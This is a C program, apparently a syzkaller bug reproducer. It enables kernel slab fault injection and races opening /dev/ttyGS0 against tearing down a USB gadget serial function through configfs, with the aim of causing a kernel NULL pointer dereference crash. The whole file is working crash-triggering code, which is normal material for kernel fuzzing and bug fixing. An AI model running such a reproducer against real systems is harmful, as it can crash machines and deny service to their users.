// https://syzkaller.appspot.com/bug?id=69b71bf98ada6c6ec45657617e1b8ccf6b890a51
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <pthread.h>
#include <errno.h>

// Configure the kernel's fault injection framework to randomly fail slab allocations
void setup_fault_inject() {
    int fd;
    fd = open("/sys/kernel/debug/failslab/probability", O_WRONLY);
    if (fd >= 0) { write(fd, "5\n", 2); close(fd); }
    
    fd = open("/sys/kernel/debug/failslab/times", O_WRONLY);
    if (fd >= 0) { write(fd, "-1\n", 3); close(fd); }
    
    fd = open("/sys/kernel/debug/failslab/task-filter", O_WRONLY);
    if (fd >= 0) { write(fd, "Y\n", 2); close(fd); }
    
    fd = open("/sys/kernel/debug/failslab/ignore-gfp-wait", O_WRONLY);
    if (fd >= 0) { write(fd, "N\n", 2); close(fd); }
}

// Enable fault injection for the calling thread
void enable_fault_inject() {
    int fd = open("/proc/self/make-it-fail", O_WRONLY);
    if (fd >= 0) { write(fd, "1\n", 2); close(fd); }
}

void *open_loop(void *arg) {
    enable_fault_inject();
    while (1) {
        int fd = open("/dev/ttyGS0", O_RDWR | O_NOCTTY);
        if (fd >= 0) close(fd);
    }
    return NULL;
}

void *reset_loop(void *arg) {
    while (1) {
        rmdir("/sys/kernel/config/usb_gadget/g1/functions/gser.0");
        mkdir("/sys/kernel/config/usb_gadget/g1/functions/gser.0", 0777);
    }
    return NULL;
}

int main() {
    int res;
    
    // Ensure devtmpfs is mounted
    res = mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    if (res < 0 && errno != EBUSY) {
        printf("[-] Failed to mount devtmpfs: %s\n", strerror(errno));
    } else {
        printf("[+] devtmpfs mounted or already mounted.\n");
    }

    // Ensure configfs is mounted
    res = mount("none", "/sys/kernel/config", "configfs", 0, NULL);
    if (res < 0 && errno != EBUSY) {
        printf("[-] Failed to mount configfs: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] configfs mounted or already mounted.\n");
    
    // Ensure debugfs is mounted for fault injection
    res = mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL);
    if (res < 0 && errno != EBUSY) {
        printf("[-] Failed to mount debugfs: %s\n", strerror(errno));
    } else {
        printf("[+] debugfs mounted or already mounted.\n");
    }
    
    // Create a dummy gadget and the serial function
    res = mkdir("/sys/kernel/config/usb_gadget/g1", 0777);
    if (res < 0 && errno != EEXIST) {
        printf("[-] Failed to create gadget dir: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Gadget dir created.\n");
    
    res = mkdir("/sys/kernel/config/usb_gadget/g1/functions/gser.0", 0777);
    if (res < 0 && errno != EEXIST) {
        printf("[-] Failed to create function dir: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Function dir created.\n");
    
    // Wait for devtmpfs to create the device node
    usleep(100000);
    
    setup_fault_inject();
    
    pthread_t t1, t2;
    // ONLY ONE thread calling open to avoid reusing tty_struct
    // Reusing tty_struct would cause tty->driver_data to be non-NULL,
    // which leads to a WARN_ON instead of the target NULL pointer dereference.
    res = pthread_create(&t1, NULL, open_loop, NULL);
    if (res != 0) {
        printf("[-] Failed to create thread 1: %s\n", strerror(res));
        exit(1);
    }
    res = pthread_create(&t2, NULL, reset_loop, NULL);
    if (res != 0) {
        printf("[-] Failed to create thread 2: %s\n", strerror(res));
        exit(1);
    }
    
    printf("[+] Threads started. Waiting for crash...\n");
    
    pthread_join(t1, NULL);
    
    return 0;
}
